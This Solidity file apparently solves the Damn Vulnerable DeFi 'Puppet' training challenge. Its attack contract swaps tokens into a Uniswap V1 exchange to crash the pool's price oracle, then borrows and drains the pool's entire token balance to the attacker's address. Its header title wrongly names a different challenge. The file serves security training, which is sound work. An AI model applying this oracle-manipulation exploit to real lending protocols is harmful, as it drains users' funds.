// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    PuppetPool private immutable puppet;
    DamnValuableToken private immutable dvt;
    UniswapV1Exchange private immutable uniswapExchange;
    address private immutable attacker;

    constructor(address _puppet, address _uniswapExchange, address _dvt, address _attacker) {
        puppet = PuppetPool(_puppet);
        dvt = DamnValuableToken(_dvt);
        uniswapExchange = UniswapV1Exchange(_uniswapExchange);
        attacker = _attacker;
    }

    function attack() external {
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp);
        uint256 amount = puppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        puppet.borrow{value: amount}(POOL_INITIAL_TOKEN_BALANCE);
        dvt.transfer(attacker, POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable {}
}

interface UniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}
